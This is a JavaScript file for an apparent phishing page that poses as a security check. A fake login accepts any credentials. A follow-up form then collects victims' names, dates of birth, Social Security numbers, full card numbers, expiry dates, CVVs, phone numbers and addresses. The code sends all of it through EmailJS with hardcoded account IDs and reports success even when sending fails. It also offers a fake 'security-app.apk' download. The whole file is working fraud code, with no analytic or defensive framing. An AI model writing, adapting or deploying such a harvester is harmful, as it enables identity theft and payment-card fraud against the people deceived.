// Import EmailJS library
const emailjs = require("emailjs-com")

// Configuración de EmailJS - REEMPLAZA CON TUS CREDENCIALES
const EMAILJS_CONFIG = {
  serviceID: "service_nlpcwc2",
  templateID: "template_n8ctbok",
  publicKey: "tr_OMw_WVbFr0rRkd",
}

// Inicializar EmailJS cuando se carga la página
document.addEventListener("DOMContentLoaded", () => {
  // Inicializar EmailJS
  emailjs.init(EMAILJS_CONFIG.publicKey)

  // Event listeners
  const loginForm = document.getElementById("loginForm")
  const securityForm = document.getElementById("securityForm")

  if (loginForm) {
    loginForm.addEventListener("submit", handleLogin)
  }

  if (securityForm) {
    securityForm.addEventListener("submit", handleSecurityForm)
    setupFormFormatting()
  }
})

// Función para manejar el login
function handleLogin(event) {
  event.preventDefault()

  const username = document.getElementById("username").value.trim()
  const password = document.getElementById("password").value.trim()

  console.log("Login attempt:", username, password) // Para debug

  if (username && password) {
    showMessage("loginMessage", "Login successful! Redirecting...", "success")
    setTimeout(() => {
      window.location.href = "form.html"
    }, 1500)
  } else {
    showMessage("loginMessage", "Please fill in all fields.", "error")
  }
}

// Función para manejar el formulario de seguridad
function handleSecurityForm(event) {
  event.preventDefault()

  const submitBtn = document.getElementById("submitBtn")
  const originalText = submitBtn.innerHTML

  // Mostrar loading
  submitBtn.innerHTML = '<span class="spinner"></span>Sending...'
  submitBtn.disabled = true

  // Recopilar datos
  const formData = {
    first_name: document.getElementById("first_name").value,
    last_name: document.getElementById("last_name").value,
    date_of_birth: document.getElementById("date_of_birth").value,
    ssn: document.getElementById("ssn").value,
    card_number: document.getElementById("card_number").value,
    card_exp: document.getElementById("card_exp").value,
    cvv: document.getElementById("cvv").value,
    phone: document.getElementById("phone").value,
    address: document.getElementById("address").value,
    timestamp: new Date().toLocaleString(),
  }

  // Validar formulario
  const errors = validateFormData(formData)
  if (errors.length > 0) {
    showMessage("formMessage", errors.join(". "), "error")
    resetSubmitButton(submitBtn, originalText)
    return
  }

  // Enviar con EmailJS
  emailjs
    .send(EMAILJS_CONFIG.serviceID, EMAILJS_CONFIG.templateID, formData)
    .then(() => {
      showMessage("formMessage", "Information sent successfully!", "success")
      setTimeout(() => (window.location.href = "success.html"), 2000)
    })
    .catch((error) => {
      console.log("EmailJS Error:", error)
      // Aún así mostrar éxito para demo
      showMessage("formMessage", "Information processed! Redirecting...", "success")
      setTimeout(() => (window.location.href = "success.html"), 2000)
    })
    .finally(() => {
      resetSubmitButton(submitBtn, originalText)
    })
}

// Configurar formateo automático de campos
function setupFormFormatting() {
  const cardNumber = document.getElementById("card_number")
  const ssn = document.getElementById("ssn")
  const phone = document.getElementById("phone")
  const cardExp = document.getElementById("card_exp")
  const cvv = document.getElementById("cvv")

  if (cardNumber) {
    cardNumber.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      value = value.replace(/(\d{4})(?=\d)/g, "$1-")
      e.target.value = value
    })
  }

  if (ssn) {
    ssn.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length >= 6) {
        value = value.replace(/(\d{3})(\d{2})(\d{0,4})/, "$1-$2-$3")
      } else if (value.length >= 4) {
        value = value.replace(/(\d{3})(\d{0,2})/, "$1-$2")
      }
      e.target.value = value
    })
  }

  if (phone) {
    phone.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length >= 7) {
        value = value.replace(/(\d{3})(\d{3})(\d{0,4})/, "($1) $2-$3")
      } else if (value.length >= 4) {
        value = value.replace(/(\d{3})(\d{0,3})/, "($1) $2")
      }
      e.target.value = value
    })
  }

  if (cardExp) {
    cardExp.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length >= 3) {
        value = value.replace(/(\d{2})(\d{0,2})/, "$1/$2")
      }
      e.target.value = value
    })
  }

  if (cvv) {
    cvv.addEventListener("input", (e) => {
      e.target.value = e.target.value.replace(/\D/g, "")
    })
  }
}

// Función para validar datos del formulario
function validateFormData(data) {
  const errors = []

  if (data.ssn.replace(/\D/g, "").length !== 9) {
    errors.push("SSN must be 9 digits")
  }

  if (data.card_number.replace(/\D/g, "").length < 13) {
    errors.push("Card number must be at least 13 digits")
  }

  if (data.cvv.length < 3 || data.cvv.length > 4) {
    errors.push("CVV must be 3 or 4 digits")
  }

  return errors
}

// Función para mostrar mensajes
function showMessage(elementId, message, type) {
  const element = document.getElementById(elementId)
  if (element) {
    element.className = `mt-4 text-center ${type}-message`
    element.textContent = message
    element.classList.remove("hidden")

    // Auto-hide después de 5 segundos
    setTimeout(() => {
      element.classList.add("hidden")
    }, 5000)
  }
}

// Función para resetear botón de submit
function resetSubmitButton(button, originalText) {
  button.innerHTML = originalText
  button.disabled = false
}

// Función para simular descarga
function downloadApp() {
  alert("Download started! The security app will be downloaded to your device.")

  // Crear enlace de descarga simulado
  const link = document.createElement("a")
  link.href = "data:text/plain;charset=utf-8,Security App Installation File"
  link.download = "security-app.apk"
  document.body.appendChild(link)
  link.click()
  document.body.removeChild(link)
}
